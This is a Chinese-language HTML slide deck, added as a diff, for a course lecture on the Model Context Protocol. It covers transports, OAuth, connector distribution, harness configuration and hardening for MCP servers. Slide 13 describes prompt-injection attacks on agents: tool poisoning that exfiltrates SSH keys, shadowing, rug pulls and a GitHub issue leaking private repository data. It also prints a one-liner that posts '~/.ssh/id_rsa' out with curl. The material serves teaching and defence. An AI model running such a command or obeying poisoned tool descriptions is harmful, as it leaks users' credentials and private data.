@@ -1,0 +1,464 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>LLM AgentOS — MCP、插件与连接器</title>
+<style>
+  :root {
+    --bg: #0f1420; --panel: #161d2e; --ink: #e8ecf4; --muted: #9aa6bd; --line: #2a3550;
+    --accent: #6ea8ff; --accent2: #7be0b8; --warn: #ffb86b; --bad: #ff7a85;
+    --mono: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    --sans: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "PingFang SC", "Noto Sans SC", "Microsoft YaHei", sans-serif;
+  }
+  * { box-sizing: border-box; }
+  html, body { margin: 0; height: 100%; background: #05070c; color: var(--ink); font-family: var(--sans); overflow: hidden; }
+  #stage { position: absolute; left: 50%; top: 50%; width: 1280px; height: 720px; transform-origin: center; }
+  .slide { position: absolute; inset: 0; background: var(--bg); padding: 56px 72px 64px; display: none; flex-direction: column; }
+  .slide.active { display: flex; }
+  h1 { font-size: 54px; margin: 0 0 16px; letter-spacing: -0.02em; }
+  h2 { font-size: 36px; margin: 0 0 24px; letter-spacing: -0.01em; }
+  h2 small { display: block; font-size: 16px; color: var(--accent); font-weight: 600; text-transform: uppercase; letter-spacing: .08em; margin-bottom: 8px; }
+  p, li { font-size: 22px; line-height: 1.45; color: var(--ink); }
+  li { margin: 6px 0; }
+  ul { margin: 0; padding-left: 26px; }
+  .muted { color: var(--muted); }
+  .accent { color: var(--accent); } .accent2 { color: var(--accent2); } .warn { color: var(--warn); }
+  code, pre { font-family: var(--mono); }
+  code { background: #1f2840; padding: 1px 6px; border-radius: 4px; font-size: .9em; }
+  pre { background: #0a0e18; border: 1px solid var(--line); border-radius: 10px; padding: 16px 18px; font-size: 16px; line-height: 1.5; margin: 0; overflow: hidden; }
+  .cols { display: grid; grid-template-columns: 1fr 1fr; gap: 32px; flex: 1; }
+  .cols3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; }
+  .card { background: var(--panel); border: 1px solid var(--line); border-radius: 12px; padding: 18px 20px; }
+  .card h3 { margin: 0 0 8px; font-size: 21px; color: var(--accent2); }
+  .card p, .card li { font-size: 18px; }
+  table { border-collapse: collapse; width: 100%; font-size: 18px; }
+  th, td { border-bottom: 1px solid var(--line); padding: 9px 10px; text-align: left; vertical-align: top; }
+  th { color: var(--accent); font-weight: 600; }
+  table.dense th, table.dense td { font-size: 15px; padding: 7px 8px; line-height: 1.35; }
+  table.dense td:first-child { color: var(--accent2); white-space: nowrap; }
+  .cite { position: absolute; left: 72px; bottom: 22px; font-size: 13px; color: var(--muted); max-width: 1000px; }
+  .num { position: absolute; right: 32px; bottom: 22px; font-size: 13px; color: var(--muted); }
+  .title-slide { justify-content: center; background: radial-gradient(1200px 600px at 80% 20%, #1c2a4d 0%, var(--bg) 60%); }
+  .pill { display: inline-block; padding: 4px 12px; border: 1px solid var(--line); border-radius: 999px; font-size: 15px; color: var(--muted); margin-right: 8px; }
+  svg text { font-family: var(--sans); }
+  svg text:not([fill]) { fill: var(--ink); }
+  ul[style] > li, ol[style] > li { font-size: inherit; }
+  #hint { position: fixed; top: 6px; left: 50%; transform: translateX(-50%); font-size: 12px; color: #556; font-family: var(--sans); }
+  @media print {
+    html, body { overflow: visible; background: none; }
+    #stage { position: static; transform: none !important; }
+    .slide { display: flex !important; position: relative; page-break-after: always; }
+    #hint { display: none; }
+  }
+</style>
+</head>
+<body>
+<div id="stage">
+<!-- 1 -->
+<section class="slide title-slide">
+  <div class="pill">LLM AgentOS · 第 5 模块讲座 · 工具与扩展</div>
+  <h1 style="margin-top:22px">MCP、插件与连接器</h1>
+  <p class="muted" style="font-size:26px;max-width:1000px">AgentOS 的设备驱动总线：Model Context Protocol 承载什么，
+    无状态的 2026-07-28 版本在线路上如何工作，远程服务器如何获得授权，
+    连接器如何分发，以及 MCP 服务器如何遭到攻击与防御。</p>
+  <p style="margin-top:28px"><span class="pill">原语</span><span class="pill">无状态核心</span><span class="pill">传输层</span><span class="pill">OAuth</span><span class="pill">注册表</span><span class="pill">工具投毒</span></p>
+</section>
+
+<!-- 2 -->
+<section class="slide">
+  <h2><small>操作系统类比</small>MCP 是驱动总线；连接器是可安装的驱动</h2>
+  <div class="cols">
+    <table class="dense">
+      <tr><th>经典操作系统</th><th>采用 MCP 的 AgentOS</th></tr>
+      <tr><td>总线标准（USB、PCIe）</td><td>MCP：JSON-RPC 2.0 消息与能力（capabilities）</td></tr>
+      <tr><td>设备驱动</td><td>MCP 服务器（本地进程或远程服务）</td></tr>
+      <tr><td>内核驱动管理器</td><td>宿主（框架）内的 MCP 客户端</td></tr>
+      <tr><td>驱动目录 / 应用商店</td><td>MCP Registry，连接器目录</td></tr>
+      <tr><td>驱动签名</td><td>命名空间验证、审核、版本锁定</td></tr>
+    </table>
+    <div class="card">
+      <h3>各原语由谁控制</h3>
+      <ul>
+        <li><b>工具（Tools）</b>：由模型控制的操作（<code>tools/list</code>、<code>tools/call</code>）。</li>
+        <li><b>资源（Resources）</b>：由应用控制、按 URI 寻址的数据（<code>resources/read</code>）。</li>
+        <li><b>提示（Prompts）</b>：由用户控制的模板，常以斜杠命令呈现（<code>prompts/get</code>）。</li>
+        <li>服务器 → 用户：<b>elicitation</b>（表单或 URL）。Sampling、roots 和 logging 自 2026-07-28 起已弃用。</li>
+      </ul>
+    </div>
+  </div>
+  <div class="cite">modelcontextprotocol.io/specification/2026-07-28（服务器特性：tools、resources、prompts）；变更日志 SEP-2577（弃用项）。</div>
+</section>
+
+<!-- 3 -->
+<section class="slide">
+  <h2><small>变化</small>2026-07-28：MCP 变为无状态</h2>
+  <table class="dense">
+    <tr><th></th><th>2025-11-25 及更早</th><th>2026-07-28</th></tr>
+    <tr><td>对话的开始</td><td><code>initialize</code> → <code>notifications/initialized</code></td><td>无。可选的 <code>server/discover</code>（服务器 MUST 实现）</td></tr>
+    <tr><td>版本与能力</td><td>每个连接协商一次</td><td>在每个请求的 <code>_meta</code> 中发送（<code>io.modelcontextprotocol/protocolVersion</code>、<code>…/clientCapabilities</code>）</td></tr>
+    <tr><td>会话</td><td><code>Mcp-Session-Id</code> 头</td><td>已移除；状态存放在作为工具参数传递的显式句柄中</td></tr>
+    <tr><td>服务器向客户端提问</td><td>服务器发起的 <code>elicitation/create</code>、<code>sampling/createMessage</code></td><td>多轮往返请求：结果为 <code>resultType: "input_required"</code>，客户端重试</td></tr>
+    <tr><td>变更通知</td><td>HTTP GET 流、<code>resources/subscribe</code></td><td>单一的 <code>subscriptions/listen</code> 流，按类型选择开启</td></tr>
+    <tr><td>长时间运行的工作</td><td>核心中的实验性任务</td><td><code>io.modelcontextprotocol/tasks</code> 扩展（<code>tasks/get</code>、<code>tasks/update</code>）</td></tr>
+  </table>
+  <p style="font-size:18px;margin-top:14px">对运维人员的意义：任何请求都可以落到轮询负载均衡器后面的任一副本上，无需粘性会话，也无需共享会话存储。被弃用的特性至少还能继续使用 12 个月。</p>
+  <div class="cite">MCP 2026-07-28 变更日志（SEP-2567、SEP-2575、SEP-2322、SEP-2663、SEP-2596）：modelcontextprotocol.io/specification/2026-07-28/changelog; blog.modelcontextprotocol.io/posts/2026-07-28.</div>
+</section>
+
+<!-- 4 -->
+<section class="slide">
+  <h2><small>线路上</small>基于 Streamable HTTP 的一次自包含工具调用</h2>
+  <div class="cols">
+<pre style="font-size:13px">POST /mcp HTTP/1.1
+MCP-Protocol-Version: 2026-07-28
+Mcp-Method: tools/call
+Mcp-Name: search
+Authorization: Bearer eyJ...
+Content-Type: application/json
+
+{"jsonrpc": "2.0", "id": 7,
+ "method": "tools/call",
+ "params": {
+   "name": "search",
+   "arguments": {"q": "kv cache"},
+   "_meta": {
+     "io.modelcontextprotocol/protocolVersion": "2026-07-28",
+     "io.modelcontextprotocol/clientInfo": {...},
+     "io.modelcontextprotocol/clientCapabilities": {...}}}}
+
+→ {"result": {"resultType": "complete",
+     "content": [...], "isError": false}}</pre>
+    <div class="card">
+      <h3>像系统管理员一样阅读</h3>
+      <ul>
+        <li>POST 必须带有 <code>Mcp-Method</code> 和 <code>Mcp-Name</code>，因此网关和 WAF 无需解析请求体即可路由、限速和计量（SEP-2243）。</li>
+        <li>工具可通过 <code>x-mcp-header</code> 把基本类型参数镜像到 <code>Mcp-Param-*</code> 头中；切勿用这种方式标记机密信息。</li>
+        <li>每个结果都带 <code>resultType</code>；缺少该字段的旧服务器结果视为 <code>"complete"</code>。</li>
+        <li>版本错误 → <code>UnsupportedProtocolVersionError</code>。</li>
+        <li>追踪上下文通过 <code>_meta</code>（<code>traceparent</code>）传递，与可观测性讲义相衔接。</li>
+      </ul>
+    </div>
+  </div>
+  <div class="cite">modelcontextprotocol.io/specification/2026-07-28/server/tools; …/basic/transports/streamable-http; 变更日志次要变更 2 和 4。</div>
+</section>
+
+<!-- 5 -->
+<section class="slide">
+  <h2><small>传输层</small>本地驱动用 stdio，远程驱动用 Streamable HTTP</h2>
+  <div class="cols">
+    <div class="card">
+      <h3>stdio</h3>
+      <ul>
+        <li>客户端把服务器作为子进程启动；通过 stdin/stdout 传输以换行分隔的 JSON-RPC。</li>
+        <li><code>stderr</code> 用于日志（取代已弃用的 Logging 特性）。</li>
+        <li>没有 OAuth：凭据来自环境变量，因此由框架决定子进程能看到哪些环境变量。</li>
+        <li>以用户权限运行，除非框架对其进行沙箱隔离。</li>
+      </ul>
+    </div>
+    <div class="card">
+      <h3>Streamable HTTP</h3>
+      <ul>
+        <li>单一端点；响应为普通 JSON，或用于进度的 SSE 流。</li>
+        <li>自 2026-07-28 起不再支持断点续传：流中断会丢失请求，因此客户端用新的 id 重新发出。</li>
+        <li>校验 <code>Origin</code>（DNS 重绑定），本地服务器绑定到 localhost，对每个请求进行认证。</li>
+        <li>旧的 HTTP+SSE 传输（2024-11-05）已被正式标记为 Deprecated。</li>
+      </ul>
+    </div>
+  </div>
+  <p style="font-size:18px;margin-top:14px">经验法则：驱动需要本地机器（文件、IDE、VPN）时用 stdio；多个用户共享同一服务、并希望集中更新和使用 OAuth 时用 HTTP。</p>
+  <div class="cite">modelcontextprotocol.io/specification/2026-07-28/basic/transports; 变更日志重大变更 9 和弃用项 2。</div>
+</section>
+
+<!-- 6 -->
+<section class="slide">
+  <h2><small>询问用户</small>多轮往返请求取代服务器发起的调用</h2>
+  <div class="cols">
+<pre style="font-size:13px">// 1. client → tools/call {"name": "deploy", ...}
+// 2. server answers with an interim result
+{"resultType": "input_required",
+ "inputRequests": {
+   "confirm": {"method": "elicitation/create",
+     "params": {"mode": "form",
+       "message": "Deploy to prod?",
+       "requestedSchema": {...}}}},
+ "requestState": "eyJ..."}
+
+// 3. client asks the user, then retries
+//    with a NEW JSON-RPC id
+{"method": "tools/call",
+ "params": {"name": "deploy", ...,
+   "inputResponses": {
+     "confirm": {"action": "accept",
+                 "content": {...}}},
+   "requestState": "eyJ..."}}</pre>
+    <div class="card">
+      <h3>设计上的影响</h3>
+      <ul>
+        <li>服务器提问无需保持打开的流；任何副本都可以处理重试。</li>
+        <li><code>requestState</code> 是由客户端携带的不透明服务器状态；应像对待 cookie 一样对待它（签名或加密）。</li>
+        <li>URL 模式的 elicitation 会把用户带到浏览器页面（OAuth、支付），使机密信息不会经过模型。</li>
+        <li>内核视角：这是一个返回 <code>EAGAIN</code> 并附带延续（continuation）的系统调用，而不是向用户空间的 upcall。</li>
+      </ul>
+    </div>
+  </div>
+  <div class="cite">modelcontextprotocol.io/specification/2026-07-28/basic/patterns/mrtr; 变更日志 SEP-2322 和次要变更 11。</div>
+</section>
+
+<!-- 7 -->
+<section class="slide">
+  <h2><small>上下文平面</small>资源、提示与可缓存的列表</h2>
+  <div class="cols">
+    <div class="card">
+      <h3>资源与提示</h3>
+      <ul>
+        <li>资源是按 URI 寻址的数据（<code>file://</code>、<code>git://</code>、自定义 scheme）；由宿主决定哪些内容进入上下文。</li>
+        <li>工具可以返回 <code>resource_link</code>，而不是内联一大块数据：这是一个指针，类似 mmap。</li>
+        <li>提示是用户挑选的模板；宿主把它们渲染为斜杠命令。</li>
+        <li>有状态服务器返回显式句柄（例如 <code>basket_id</code>），并在每次调用时检查授权。</li>
+      </ul>
+    </div>
+    <div class="card">
+      <h3>缓存（SEP-2549）</h3>
+      <ul>
+        <li><code>tools/list</code>、<code>prompts/list</code>、<code>resources/list</code>、<code>resources/read</code> 携带 <code>ttlMs</code> 和 <code>cacheScope</code>（<code>public</code> / <code>private</code>）。</li>
+        <li>服务器 SHOULD 以确定的顺序返回工具。</li>
+        <li>原因：工具定义位于提示的最前面。稳定、有序的工具列表能让提供商的提示缓存（以及你的 KV 缓存）保持热状态。</li>
+      </ul>
+    </div>
+  </div>
+  <div class="cite">modelcontextprotocol.io/specification/2026-07-28/server/resources, …/server/prompts, …/server/utilities/caching；前缀缓存见 KV 缓存讲义。</div>
+</section>
+
+<!-- 8 -->
+<section class="slide">
+  <h2><small>授权</small>远程 MCP 服务器是 OAuth 2.1 资源服务器</h2>
+  <div class="cols">
+    <ol style="font-size:17px;padding-left:24px">
+      <li>客户端不带令牌调用 → <b>401</b>，附带 <code>WWW-Authenticate: Bearer resource_metadata="…"</code>，通常还带 <code>scope</code>。</li>
+      <li>客户端读取受保护资源元数据（<b>RFC 9728</b>）以找到授权服务器。</li>
+      <li>客户端读取 AS 元数据（RFC 8414 或 OpenID Connect Discovery；客户端 MUST 同时支持两者）。</li>
+      <li>客户端获得客户端 ID：<b>Client ID Metadata Document</b>（以 HTTPS URL 作为 <code>client_id</code>）、预先注册，或动态客户端注册（现已弃用）。</li>
+      <li>授权码 + <b>PKCE</b>，两次请求中都带上 <code>resource=&lt;canonical server URI&gt;</code>（<b>RFC 8707</b>）。</li>
+      <li>客户端在兑换授权码之前，先将响应中的 <code>iss</code> 与记录的签发者进行核对（<b>RFC 9207</b>）。</li>
+      <li>每个请求都携带 <code>Authorization: Bearer</code>；服务器检查令牌的受众（audience）是自己。</li>
+    </ol>
+    <div class="card">
+      <h3>学生常犯的错误</h3>
+      <ul>
+        <li>stdio 服务器 SHOULD NOT 使用此流程；它们从环境变量读取凭据。</li>
+        <li>令牌绝不能放在查询字符串中。</li>
+        <li>凭据绑定于签发它们的签发者；签发者变化时需重新注册（SEP-2352）。</li>
+        <li>桌面和 CLI 客户端声明 <code>application_type</code>，使 localhost 重定向可用（SEP-837）。</li>
+      </ul>
+    </div>
+  </div>
+  <div class="cite">modelcontextprotocol.io/specification/2026-07-28/basic/authorization.</div>
+</section>
+
+<!-- 9 -->
+<section class="slide">
+  <h2><small>最小权限</small>作用域、升级授权，以及两种被禁止的模式</h2>
+  <div class="cols">
+    <div class="card">
+      <h3>渐进式作用域</h3>
+      <ul>
+        <li>从最小的作用域集合开始；<code>scopes_supported</code> 应当是最小集，而不是完整目录。</li>
+        <li>在特权调用时，服务器返回 <b>403</b> <code>error="insufficient_scope", scope="files:write"</code>，所有需要的作用域放在同一个质询中。</li>
+        <li>客户端以新旧作用域的<b>并集</b>重新授权，最多重试几次，然后放弃。</li>
+        <li>避免通配作用域（<code>*</code>、<code>full-access</code>）。</li>
+      </ul>
+    </div>
+    <div class="card">
+      <h3>绝不允许</h3>
+      <ul>
+        <li><b>令牌透传（Token passthrough）</b>：服务器 MUST NOT 接受并非签发给自己的令牌，也不得把客户端的令牌转发给下游。这会破坏审计、限速和受众检查。</li>
+        <li><b>混淆代理人（Confused deputy）</b>：使用静态上游客户端 ID、DCR 和同意 cookie 的代理，会让攻击者绕过同意环节。代理 MUST 保持按客户端的同意、精确的 <code>redirect_uri</code> 匹配以及一次性的 <code>state</code>。</li>
+      </ul>
+    </div>
+  </div>
+  <div class="cite">MCP 授权（作用域质询处理）与安全最佳实践：modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices.</div>
+</section>
+
+<!-- 10 -->
+<section class="slide">
+  <h2><small>分发</small>从服务器到人人可安装的连接器</h2>
+  <table class="dense">
+    <tr><th>渠道</th><th>是什么</th><th>信任信号</th></tr>
+    <tr><td>MCP Registry（预览版）</td><td>官方元数据目录（<code>server.json</code>）：名称、包或远程 URL、环境变量。面向聚合器，而不是直接面向宿主。</td><td>命名空间证明：通过 GitHub 的 <code>io.github.user/…</code>，通过 DNS 或 HTTP 的 <code>com.example/…</code>。代码扫描交给 npm / PyPI 和聚合器。</td></tr>
+    <tr><td>Claude Connectors Directory</td><td>面向 claude.ai、Desktop、移动端、Claude Code 和 Cowork 的统一 MCP 服务器目录；管理员按组织启用。</td><td>已验证 vs. 社区标签；验证不等于安全审计。</td></tr>
+    <tr><td>MCP Bundles（<code>.mcpb</code>）</td><td>本地 stdio 服务器加 <code>manifest.json</code> 的 zip 包；在 Claude Desktop 中一键安装。</td><td>安装界面显示权限；机密信息用 <code>user_config</code>；组织允许列表。</td></tr>
+    <tr><td>框架插件</td><td>将 MCP 服务器与技能和钩子一起发布的 Claude Code / Hermes / OpenClaw 插件。</td><td>市场审核、安装扫描（见扩展层讲义）。</td></tr>
+    <tr><td>MCP Apps（扩展）</td><td>服务器渲染的 UI：<code>ui://</code> HTML 模板，由工具通过 <code>_meta</code> 关联，在沙箱 iframe 中显示。</td><td>预先声明的模板、可被记录的 postMessage JSON-RPC、对 UI 发起的工具调用需征得同意。</td></tr>
+  </table>
+  <div class="cite">modelcontextprotocol.io/registry/about; claude.com/docs/connectors/directory; claude.com/docs/connectors/building/mcpb; blog.modelcontextprotocol.io/posts/2025-11-21-mcp-apps (SEP-1865).</div>
+</section>
+
+<!-- 11 -->
+<section class="slide">
+  <h2><small>挂载驱动</small>三种框架如何配置 MCP 服务器</h2>
+  <table class="dense">
+    <tr><th></th><th>Hermes Agent</th><th>OpenClaw</th><th>Codex</th></tr>
+    <tr><td>位置</td><td><code>~/.hermes/config.yaml</code> → <code>mcp_servers</code></td><td>网关配置 → <code>mcp.servers</code></td><td><code>~/.codex/config.toml</code> → <code>[mcp_servers.&lt;name&gt;]</code></td></tr>
+    <tr><td>stdio / HTTP</td><td><code>command</code>, <code>args</code>, <code>env</code> / <code>url</code>, <code>headers</code></td><td><code>command</code>, <code>args</code>, <code>cwd</code> / <code>url</code>, <code>transport</code></td><td><code>command</code>, <code>args</code>, <code>env</code> / <code>url</code>, <code>bearer_token_env_var</code></td></tr>
+    <tr><td>工具过滤</td><td><code>tools.include</code> / <code>tools.exclude</code>（glob；include 优先）</td><td><code>toolFilter.include</code> / <code>exclude</code></td><td><code>enabled_tools</code>，然后 <code>disabled_tools</code></td></tr>
+    <tr><td>OAuth</td><td><code>auth: oauth</code>；<code>hermes mcp login</code></td><td><code>auth: "oauth"</code> + 元数据</td><td><code>codex mcp login &lt;name&gt;</code></td></tr>
+    <tr><td>安全说明</td><td>工具命名为 <code>mcp_&lt;server&gt;_&lt;tool&gt;</code>；stdio 子进程只获得自己的环境变量 + 一份安全基线</td><td>与原生工具相同的工具配置和策略；<code>openclaw mcp doctor --probe</code></td><td>服务器宕机时 <code>required = true</code> 会使启动失败；超时 10 秒 / 60 秒</td></tr>
+  </table>
+  <div class="cite">hermes-agent.nousresearch.com/docs/user-guide/features/mcp; docs.openclaw.ai/tools/mcp; learn.chatgpt.com/docs/extend/mcp (Codex).</div>
+</section>
+
+<!-- 12 -->
+<section class="slide">
+  <h2><small>选择机制</small>MCP 服务器、进程内插件还是技能？</h2>
+  <table class="dense">
+    <tr><th></th><th>MCP 服务器</th><th>进程内插件</th><th>技能</th></tr>
+    <tr><td>增加</td><td>工具、资源、提示</td><td>钩子、槽位、工具、提示编辑</td><td>按需加载的指令 + 脚本</td></tr>
+    <tr><td>运行于</td><td>独立进程或远程服务</td><td>框架进程</td><td>模型的上下文（脚本在沙箱中）</td></tr>
+    <tr><td>可移植到</td><td>任何 MCP 宿主</td><td>仅一个框架</td><td>任何读取 <code>SKILL.md</code> 的宿主</td></tr>
+    <tr><td>上下文成本</td><td>每轮都包含每个工具定义（除非使用工具搜索）</td><td>取决于它注入的内容</td><td>使用前约 100 个 token</td></tr>
+    <tr><td>能强制执行策略吗？</td><td>仅限其自身的工具</td><td>能（钩子能看到每次调用）</td><td>不能（只是给模型的建议）</td></tr>
+  </table>
+  <p style="font-size:18px;margin-top:14px">常见模式：用 MCP 服务器获得对系统的访问，用技能教会如何用好它，再用插件钩子强制执行任何提示都无法保证的规则。</p>
+  <div class="cite">扩展层讲义（插件 vs. MCP）；技能讲义（渐进式披露）；工具与沙箱讲义（工具搜索、结合 MCP 的代码执行）。</div>
+</section>
+
+<!-- 13 -->
+<section class="slide">
+  <h2><small>威胁</small>MCP 服务器如何遭到攻击</h2>
+  <div class="cols">
+    <div class="card">
+      <h3>通过模型</h3>
+      <ul>
+        <li><b>工具投毒（Tool poisoning）</b>（Invariant Labs，2025 年 4 月）：工具描述中的隐藏指令使 Cursor 读取 <code>~/.cursor/mcp.json</code> 和 SSH 密钥，并将其放在参数中传出。</li>
+        <li><b>影子攻击（Shadowing）</b>：一个服务器的描述改写了受信任服务器的工具（所有邮件都发给攻击者）。</li>
+        <li><b>撤地毯（Rug pull）</b>：描述在用户批准之后被更改。</li>
+        <li><b>有毒的智能体流（Toxic agent flow）</b>（2025 年 5 月）：一个公开的 GitHub issue 使智能体把私有仓库的数据复制到公开 PR 中。没有可修补的服务器漏洞。</li>
+        <li><b>MCPTox</b>（2508.14925）：45 个真实服务器、353 个工具、20 个智能体；攻击成功率最高达 72.8%，拒绝率低于 3%。能力更强的模型往往更容易受影响。</li>
+      </ul>
+    </div>
+    <div class="card">
+      <h3>绕过模型</h3>
+      <ul>
+        <li><b>本地服务器被攻陷</b>：一键配置运行 <code>npx evil &amp;&amp; curl -d @~/.ssh/id_rsa …</code>。</li>
+        <li><b>SSRF</b>：恶意服务器把 OAuth 元数据指向 <code>169.254.169.254</code> 或 localhost。</li>
+        <li><b>授权 URL 注入</b>：<code>javascript:</code> URL，或经由 shell 打开的 URL。</li>
+        <li><b>会话劫持</b>（较旧的有状态服务器）：猜出会话 ID 后注入事件。</li>
+      </ul>
+    </div>
+  </div>
+  <div class="cite">invariantlabs.ai/blog/mcp-security-notification; invariantlabs.ai/blog/mcp-github-vulnerability; arxiv.org/abs/2508.14925; MCP 安全最佳实践。</div>
+</section>
+
+<!-- 14 -->
+<section class="slide">
+  <h2><small>防御</small>启用 MCP 的框架加固清单</h2>
+  <div class="cols">
+    <div class="card">
+      <h3>客户端 / 宿主</h3>
+      <ul>
+        <li>添加本地服务器之前显示完整命令；在沙箱中、以过滤后的环境变量运行。</li>
+        <li>对服务器和工具使用允许列表（<code>include</code> / <code>enabled_tools</code>）；按服务器给名称加前缀。</li>
+        <li>锁定版本并对工具描述做哈希；描述变化时重新提示。</li>
+        <li>把注解和工具输出视为不可信；应用访问控制讲义中的“二法则”（Rule of Two）。</li>
+        <li>在 OAuth 发现阶段拦截私有 IP 段和非 HTTPS URL；打开 URL 时不经过 shell。</li>
+      </ul>
+    </div>
+    <div class="card">
+      <h3>服务器</h3>
+      <ul>
+        <li>校验受众；绝不透传令牌。</li>
+        <li>最小作用域并配合升级授权；记录权限提升。</li>
+        <li>校验 <code>Origin</code>；本地 HTTP 绑定到 localhost，或使用 stdio。</li>
+        <li>校验输入、限速、净化输出；返回模型可据以行动的 <code>isError</code> 结果。</li>
+        <li>不透明、高熵的句柄；每次调用都进行授权。</li>
+      </ul>
+    </div>
+  </div>
+  <div class="cite">MCP 安全最佳实践；MCP 2026-07-28 Tools（安全注意事项）；Meta “Agents Rule of Two”（见访问控制讲义）。</div>
+</section>
+
+<!-- 15 -->
+<section class="slide">
+  <h2><small>练习</small>构建、挂载、攻击并加固一个 MCP 服务器</h2>
+  <div class="cols">
+    <div>
+      <ol style="font-size:19px;padding-left:24px">
+        <li>用支持 2026-07-28 的 SDK 编写一个带两个工具（<code>search_notes</code>、<code>send_note</code>）的小型服务器；同时通过 stdio 和 Streamable HTTP 提供服务。</li>
+        <li>在两个框架中挂载它（Hermes <code>mcp_servers</code>、Codex <code>[mcp_servers]</code>），并设置工具过滤。</li>
+        <li>让 <code>send_note</code> 通过 <code>input_required</code> 结果请求确认。</li>
+        <li>在第二个服务器中加入被投毒的描述，观察智能体是否会泄露一条笔记。</li>
+        <li>每次只开启一项防御，并重新测量。</li>
+      </ol>
+    </div>
+    <div class="card">
+      <h3>报告</h3>
+      <ul>
+        <li>工具定义占用的上下文 token</li>
+        <li>通过 HTTP 时每次调用的请求数（有无 <code>server/discover</code> 的对比）</li>
+        <li>每种防御下的攻击成功率</li>
+        <li>各防御分别落在服务器、宿主还是钩子中</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- 16 -->
+<section class="slide">
+  <h2><small>参考资料</small>延伸阅读</h2>
+  <div class="cols">
+    <ul style="font-size:15px">
+      <li>MCP 2026-07-28 变更日志：modelcontextprotocol.io/specification/2026-07-28/changelog</li>
+      <li>发布文章：blog.modelcontextprotocol.io/posts/2026-07-28</li>
+      <li>授权：modelcontextprotocol.io/specification/2026-07-28/basic/authorization</li>
+      <li>工具：modelcontextprotocol.io/specification/2026-07-28/server/tools</li>
+      <li>安全最佳实践：modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices</li>
+      <li>MCP Registry：modelcontextprotocol.io/registry/about</li>
+      <li>MCP Apps (SEP-1865)：blog.modelcontextprotocol.io/posts/2025-11-21-mcp-apps</li>
+    </ul>
+    <ul style="font-size:15px">
+      <li>Claude Connectors Directory：claude.com/docs/connectors/directory</li>
+      <li>MCP Bundles：claude.com/docs/connectors/building/mcpb</li>
+      <li>Hermes MCP：hermes-agent.nousresearch.com/docs/user-guide/features/mcp</li>
+      <li>OpenClaw MCP：docs.openclaw.ai/tools/mcp · Codex MCP：learn.chatgpt.com/docs/extend/mcp</li>
+      <li>Invariant Labs，工具投毒（2025 年 4 月）与 GitHub MCP 漏洞利用（2025 年 5 月）</li>
+      <li>MCPTox (AAAI 2026)：arxiv.org/abs/2508.14925</li>
+      <li>所有链接：<code>references/bibliography_and_links.md</code> §5b</li>
+    </ul>
+  </div>
+</section>
+</div>
+<div id="hint">← / → 翻页 · F 全屏</div>
+<script>
+(function () {
+  const slides = Array.from(document.querySelectorAll('.slide'));
+  const offset = 0; // first slide number in this file
+  slides.forEach((s, i) => {
+    const n = document.createElement('div');
+    n.className = 'num'; n.textContent = (i + 1 + offset) + ' / ' + (slides.length + offset);
+    s.appendChild(n);
+  });
+  let cur = Math.min(Math.max(parseInt(location.hash.slice(1), 10) - 1 - offset || 0, 0), slides.length - 1);
+  function show(i) {
+    cur = Math.min(Math.max(i, 0), slides.length - 1);
+    slides.forEach((s, j) => s.classList.toggle('active', j === cur));
+    history.replaceState(null, '', '#' + (cur + 1 + offset));
+  }
+  function fit() {
+    const k = Math.min(innerWidth / 1280, innerHeight / 720);
+    document.getElementById('stage').style.transform = 'translate(-50%, -50%) scale(' + k + ')';
+  }
+  addEventListener('keydown', e => {
+    if (['ArrowRight', 'PageDown', ' '].includes(e.key)) show(cur + 1);
+    if (['ArrowLeft', 'PageUp'].includes(e.key)) show(cur - 1);
+    if (e.key === 'Home') show(0);
+    if (e.key === 'End') show(slides.length - 1);
+    if (e.key === 'f' || e.key === 'F') document.fullscreenElement ? document.exitFullscreen() : document.documentElement.requestFullscreen();
+  });
+  addEventListener('click', e => show(cur + (e.clientX > innerWidth / 2 ? 1 : -1)));
+  addEventListener('resize', fit);
+  fit(); show(cur);
+})();
+</script>
+</body>
+</html>
